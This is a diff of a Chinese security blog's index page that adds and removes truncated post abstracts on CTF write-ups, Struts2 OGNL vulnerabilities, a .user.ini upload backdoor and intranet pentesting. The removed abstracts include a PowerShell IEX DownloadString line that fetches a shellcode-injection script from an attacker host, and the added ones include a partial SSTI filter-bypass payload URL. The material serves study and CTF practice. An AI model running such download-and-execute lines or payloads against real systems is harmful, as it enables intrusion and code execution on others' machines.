@@ -351,6 +351,145 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/09/08/php-fpm&fast-cgi学习/" >
+            
+                <span>php-fpm&amp;fast-cgi学习</span>
+        </a>
+        <div class="abstract-content">
+            概念理解cgiCGI全称是“通用网关接口”(Common Gateway Interface)，它是一个协议，它可以让一个客户端，从网页浏览器向执行在Web服务器上的程序请求数据，比如发送给后端程序php，
+举个例子当访问127.0.0.1:90003/cgi-bin/user?id=1
+
+1234561：客户端访问 http://127.0.0.1:9003/cgi-bin/user?id=12：服务器监听 9003 端口的守护进程接受到该请求，通过解析 HTTP 头信息，得知是 GET 请求，并且请求的是 /cgi-bin/目录下的 user文件。3：将 uri 里的 id=1通过存...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/08</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/09/06/2019护网杯esaypy/" >
+            
+                <span>2019护网杯esaypy</span>
+        </a>
+        <div class="abstract-content">
+            前言本次护网杯 4道web， 两道python，其中一道0解，一道java web好像也是0解，然后一道web+逆os。。。运气比较好，通过第一题道0解 python ssrf扫除了还没开放的ssti。。以为是ssrf的第二步。。然后ssti题目一上，就把flag交了，拿了一血
+easypy过滤及其残忍
+绕过方法是动态传参
+能够获取到str类
+
+12345http://49.232.103.198:57666/render?data=&#123;&#123;%22%22|attr(request.args.param)|attr(request.args.mro)|attr(reques...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/06</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/24/java安全漏洞入门之 s2-003&s2-005/" >
+            
+                <span>java安全漏洞入门之 s2-003&amp;s2-005</span>
+        </a>
+        <div class="abstract-content">
+            S2-003前言这篇漏洞分析是自己独立调试的，没有参考师傅们的调试步骤，明白了漏洞的执行步骤，相比于S2-001，对于调试已经漏洞的理解已经有很大程度的提升了
+漏洞详情https://cwiki.apache.org/confluence/display/WW/S2-003
+漏洞原因是由于限制了#开头的ognl表达式，但是可以用unicode字符进行绕过，成功执行命令
+环境搭建由于特殊字符的原因，tomcat版本需要低于7，这里选择6.0.9http://archive.apache.org/dist/tomcat/tomcat-6/v6.0.9/
+http://archive.apac...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/24</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/24/java安全漏洞入门之 s2-001/" >
+            
+                <span>java安全漏洞入门之 s2-001</span>
+        </a>
+        <div class="abstract-content">
+            前言java安全还没接触过，都大三了，需要摸一摸java安全了，看大部分都是从S2001开始入门调试的，所以自己也来学一学这个漏洞，是跟着师傅们的文章进行一步一步调试的，因为不太会java调试orz
+漏洞详情https://cwiki.apache.org/confluence/display/WW/S2-001
+由于ognl表达式的递归执行，造成了ognl执行命令
+环境搭建
+MxSrvs_Tomcat_8.5.16
+IntelliJ IDEA
+
+
+目录结构
+先从http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/24</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/21/谈.user.ini后门/" >
+            
+                <span>.user.ini后门</span>
+        </a>
+        <div class="abstract-content">
+            这个点在SUCTF中出现了，之前没见过，于是来学习一下
+原题CheckIn做法，上传一个.user.ini文件，因为在黑名单之外，接着用.user.ini去包含这个gif，即可getshell，因为不能出现&lt;? 所以用&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;
+https://xz.aliyun.com/t/6042#toc-25
+什么是.user.ini除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#39...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/08/15/laravel5.7-unserialize-RCE/" >
             
                 <span>laravel5.7-unserialize-RCE</span>
@@ -465,156 +604,6 @@ add后的req包
             <!-- date  -->
             <div class="abstract-date">
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/07</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/06/proto1/" >
-            
-                <span>JavaScript Prototype 污染攻击之 基础篇</span>
-        </a>
-        <div class="abstract-content">
-            JavaScript Prototype 污染攻击之 基础篇JS创建类的方法通过”字面量“方式创建1var person = (name:&apos;dongjc&apos;, work:function() &#123;console.log(&apos;write coding&apos;)&#125;);
-通过”构造函数“方式创建。通过object方式创建1234567var person = new Object();person.name = &quot;dongjc&quot;;person.age = 32;person.Introduce = function () &#...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/06</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/24/powersploit/" >
-            
-                <span>内网中的PowerSploit</span>
-        </a>
-        <div class="abstract-content">
-            内网中的PowerSploit靶机 Win2008攻击机 Kali
-Powershell下载命令获取补丁
-1Get-WmiObject -Class Win32_QuickFixEngineering
-一句话下载
-1IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.107.1/PS1/Invoke-Shellcode.ps1)
-Shellcode InjectionInvoke-Shellcode.ps1-Shellcode注入
-先在win2008上下载攻击机上的ps脚本
-
-1IEX(New-Object ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/24</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/23/全国大学生/" >
-            
-                <span>第12届全国大学生信息安全竞赛Web题解</span>
-        </a>
-        <div class="abstract-content">
-            全国大学生Web1一共三个考点：
-
-parse_url绕过http://lawlietweb.com/2018/05/13/parse_url/
-wakeup绕过https://paper.seebug.org/39/
-随机数（此处两解）
-
-hint.php
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phperror_reporting(E_ALL);class Handle&#123;    private $handle;    /...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/23</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/22/ddctf/" >
-            
-                <span>DDCTF部分 Write up</span>
-        </a>
-        <div class="abstract-content">
-            DDCTF菜的真实，只出了3个Web
-滴（脑洞题）http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09
-flag.jpg -&gt; hex -&gt; base64 -&gt; base64
-换成index.php 拿到源码
-https://blog.csdn.net/FengBanLiuYun/article/details/80913909
-提示practice.txt
-于是读
-发现f1ag!ddctf.php改为f1agconfigddctf.php
-读到源码
-123456789101112131...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/22</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/21/Cobalt Strike/" >
-            
-                <span>How To Use Cobalt Strike(备忘录)</span>
-        </a>
-        <div class="abstract-content">
-            How To Use Cobalt Strike(备忘录)下载地址参考lz1y师傅的https://xz.aliyun.com/t/2170
-记录一下Cobalt Strike一些简单的使用
-Infokali 192.168.107.145vps 34.xx.xx.xx
-Service OnLocal直接在kali运行
-12# 本地默认密码12345./teamserver 127.0.0.1 12345
-
-
-With VPSvps上运行
-12./teamserver IP 密码./teamserver 34.xx.xx.xx hu3sky
-然后在用kali
-User随意填写 Passw...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/21</span>
             </div>
             <!-- tags  -->
             
@@ -1843,9 +1832,88 @@ User随意填写 Passw...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 75
+        Total : 80
         </div>
         <!-- search  -->
         
@@ -1858,6 +1926,31 @@ User随意填写 Passw...
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/2019/09/08/php-fpm&fast-cgi学习/" >php-fpm&fast-cgi学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2019/09/06/2019护网杯esaypy/" >2019护网杯esaypy</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2019/08/24/java安全漏洞入门之 s2-003&s2-005/" >java安全漏洞入门之 s2-003&s2-005</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2019/08/24/java安全漏洞入门之 s2-001/" >java安全漏洞入门之 s2-001</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2019/08/21/谈.user.ini后门/" >.user.ini后门</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2285,6 +2378,8 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
+        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
+    
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
         <span class="sidebar-category-name" data-categories="浏览器安全"><span class="iconfont-archer">&#xe60a;</span>浏览器安全</span>
@@ -2301,23 +2396,27 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
+        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
+    
         <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
     
         <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
     
-        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
+        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
         <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
-    
-        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
         <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
     
         <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
-        <span class="sidebar-category-name" data-categories="JavaScript"><span class="iconfont-archer">&#xe60a;</span>JavaScript</span>
+        <span class="sidebar-category-name" data-categories="java安全"><span class="iconfont-archer">&#xe60a;</span>java安全</span>
     
         <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
+    
+        <span class="sidebar-category-name" data-categories="JavaScript"><span class="iconfont-archer">&#xe60a;</span>JavaScript</span>
+    
+        <span class="sidebar-category-name" data-categories="php魔法"><span class="iconfont-archer">&#xe60a;</span>php魔法</span>
     
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
@@ -2331,9 +2430,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
     
-        <span class="sidebar-category-name" data-categories="前端"><span class="iconfont-archer">&#xe60a;</span>前端</span>
-    
         <span class="sidebar-category-name" data-categories="线下赛"><span class="iconfont-archer">&#xe60a;</span>线下赛</span>
+    
+        <span class="sidebar-category-name" data-categories="前端"><span class="iconfont-archer">&#xe60a;</span>前端</span>
     
         <span class="sidebar-category-name" data-categories="域渗透"><span class="iconfont-archer">&#xe60a;</span>域渗透</span>
     
